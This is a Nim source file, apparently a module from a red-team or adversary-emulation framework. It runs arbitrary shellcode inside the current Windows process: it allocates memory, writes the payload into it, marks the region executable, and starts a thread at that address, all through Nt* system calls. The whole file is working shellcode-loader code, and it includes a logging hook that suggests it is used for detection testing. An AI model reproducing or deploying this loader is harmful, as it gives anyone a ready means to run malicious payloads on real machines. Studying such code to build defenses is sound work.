import ../rth
import ../utils/utils
import ../utils/winapi_wrapper
import winim/lean
import strformat
import ../utils/timeline

#[
  Executes shellcode on the most simple way in the current process.
  It works by allocating Memory, writing the shellcode to it,
  define the region as executable and create a new thread
  starting from that region.
]#


proc execute*(payload: Payload): bool =

  var payloadSize: SIZE_T = len(payload.bytes)
  let bufferAddress: PVOID = unsafeAddr(payload.bytes[0])
  let procHandle: HANDLE = -1
  var hThread: HANDLE
  var baseAddr: PVOID
  var zeroBits: ULONG_PTR
  var status: NTSTATUS


  # Timeline Logging
  logExecToTimeline(payload, "Execute-Shellcode")


  # Allocate XX bytes of (local) Memory to place the shellcode in
  status = wNtAllocateVirtualMemory(procHandle, addr baseAddr, zeroBits, addr payloadSize, MEM_COMMIT.or(MEM_RESERVE), PAGE_READWRITE)

  DBG(fmt"[+] Byte on position 10: {cast[int](payload.bytes[9]):#X}")

  if status == STATUS_SUCCESS:
    DBG(fmt"[+] Allocated memory @ {cast[int](baseAddr):#X}")
  else:
    DBG(fmt"[-] Failed to allocate memory")
    return false


  # reset the payload size back to the original size
  payloadSize = len(payload.bytes)
  var bytesWritten: ULONG = 0

  # this is required because NtWriteVirtualMemory seems to change the address (pretty weird)
  var backupBufferAddr = baseAddr

  DBG(fmt"[*] Writing {payloadSize} bytes to buffer")

  # Write the shellcode to the newly created buffer
  status = wNtWriteVirtualMemory(procHandle, baseAddr, bufferAddress, cast[ULONG](payloadSize), addr bytesWritten)

  if status == STATUS_SUCCESS:
    DBG(fmt"[+] Successfully wrote shellcode to memory @ {cast[int](baseAddr):#X} (backup: {cast[int](backupBufferAddr):#X})")
  else:
    DBG(fmt"[-] Failed to write process memory")
    return false


  # Make the memory region readable/executable
  var oldAccessProtection: ULONG
  status = wNtProtectVirtualMemory(procHandle, addr backupBufferAddr, addr payloadSize, PAGE_EXECUTE_READ, addr oldAccessProtection)

  if status == STATUS_SUCCESS:
    DBG(fmt"[+] Successfully changed access protection [@ {cast[int](backupBufferAddr):#X}]")
  else:
    DBG(fmt"[-] Failed change access protection")
    return false


  # Spawn a new thread, taking the buffer base as the starting address
  status = wNtCreateThreadEx(addr hThread,
                          MAXIMUM_ALLOWED,
                          cast[LPVOID](0),
                          procHandle,
                          cast[LPTHREAD_START_ROUTINE](backupBufferAddr),
                          cast[LPVOID](0), false, 0, 0, 0, cast[LPVOID](0))


  if status == STATUS_SUCCESS:
    DBG(fmt"[+] Successfully spawned thread [Thread ID: {hThread}]")
    status = wWaitForSingleObject(hThread, cast[DWORD](0xFFFF_FFFF))
    DBG(fmt"[+] WaitForSingleObject status: {status}")
  else:
    DBG(fmt"[-] Failed spawn new thread")
    return false

  return true

